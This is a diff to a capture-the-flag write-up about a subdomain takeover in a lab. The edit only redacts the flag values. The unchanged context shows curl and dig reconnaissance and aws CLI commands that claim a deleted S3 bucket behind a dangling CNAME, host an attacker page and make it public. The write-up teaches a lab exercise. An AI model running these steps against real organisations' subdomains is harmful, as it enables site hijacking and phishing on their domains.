@@ -224,7 +224,7 @@ curl -I http://secrethelpdesk934752.support.futurevera.thm
 ```
 HTTP/1.1 302 Found
 Date: ...
-Location: http://flag{*********************************}.s3-website-us-west-3.amazonaws.com/
+Location: http://flag{[REDACTED]}.s3-website-us-west-3.amazonaws.com/
 ```
 
 The server returns an HTTP 302 redirect pointing to an AWS S3 bucket URL. The CNAME record for this subdomain was configured to point to an S3 bucket static website endpoint — but the bucket has been **deleted**.
@@ -234,7 +234,7 @@ The server returns an HTTP 302 redirect pointing to an AWS S3 bucket URL. The CN
 Visiting the URL in a browser yields an error confirming the bucket is unclaimed:
 
 > **Hmm. We're having trouble finding that site.**
-> We can't connect to the server at **`flag{*********************************}.s3-website-us-west-3.amazonaws.com`**.
+> We can't connect to the server at **`flag{[REDACTED]}.s3-website-us-west-3.amazonaws.com`**.
 
 ### Root Cause Analysis
 
@@ -242,7 +242,7 @@ The DNS chain for this subdomain looks like this:
 
 ```
 secrethelpdesk934752.support.futurevera.thm
-  └── CNAME ──→ flag{...}.s3-website-us-west-3.amazonaws.com
+  └── CNAME ──→ flag{[REDACTED]}.s3-website-us-west-3.amazonaws.com
                       └── AWS S3 bucket ──→ DELETED / UNCLAIMED
 ```
 
@@ -265,21 +265,21 @@ dig CNAME secrethelpdesk934752.support.futurevera.thm
 ```
 
 ```bash
-curl -I http://flag{*********************************}.s3-website-us-west-3.amazonaws.com
+curl -I http://flag{[REDACTED]}.s3-website-us-west-3.amazonaws.com
 
 # Expected: 404 NoSuchBucket — confirms the bucket is unclaimed
 ```
 
 ### Step 5.2: Register the Unclaimed Bucket
 
-The AWS S3 bucket name is extracted from the CNAME or redirect URL. In this lab, the bucket name itself contains the flag (`flag{...}`), but in a real engagement, the attacker would:
+The AWS S3 bucket name is extracted from the CNAME or redirect URL. In this lab, the bucket name itself contains the flag (`flag{[REDACTED]}`), but in a real engagement, the attacker would:
 
 1. **Create an AWS account** (if not already owned)
 2. **Register the S3 bucket** with the exact same name using the AWS CLI or Console:
 
 ```bash
 aws s3api create-bucket \
-    --bucket flag{*********************************} \
+    --bucket flag{[REDACTED]} \
     --region us-west-3 \
     --create-bucket-configuration LocationConstraint=us-west-3
 ```
@@ -287,7 +287,7 @@ aws s3api create-bucket \
 3. **Enable static website hosting** on the bucket:
 
 ```bash
-aws s3 website s3://flag{*********************************} \
+aws s3 website s3://flag{[REDACTED]} \
     --index-document index.html \
     --error-document error.html
 ```
@@ -298,14 +298,14 @@ aws s3 website s3://flag{*********************************} \
 echo '<h1>Subdomain Takeover Successful</h1>
 <p>This subdomain is now under attacker control.</p>' > index.html
 
-aws s3 cp index.html s3://flag{*********************************}/
+aws s3 cp index.html s3://flag{[REDACTED]}/
 ```
 
 5. **Apply a bucket policy** allowing public read access:
 
 ```bash
 aws s3api put-bucket-policy \
-    --bucket flag{*********************************} \
+    --bucket flag{[REDACTED]} \
     --policy '{
         "Version": "2012-10-17",
         "Statement": [{
@@ -313,7 +313,7 @@ aws s3api put-bucket-policy \
             "Effect": "Allow",
             "Principal": "*",
             "Action": "s3:GetObject",
-            "Resource": "arn:aws:s3:::flag{*********************************}/*"
+            "Resource": "arn:aws:s3:::flag{[REDACTED]}/*"
         }]
     }'
 ```
@@ -328,7 +328,7 @@ Once the bucket is registered and hosting is enabled, visiting `http://secrethel
 
 Within the lab environment, the flag is obtained directly from the S3 bucket name exposed in the HTTP redirect or browser error message.
 
-**Flag value:** `flag{*********************************}`
+**Flag value:** `flag{[REDACTED]}`
 
 The flag is obtained by following the HTTP 302 redirect from `http://secrethelpdesk934752.support.futurevera.thm` and reading the target bucket name.
 
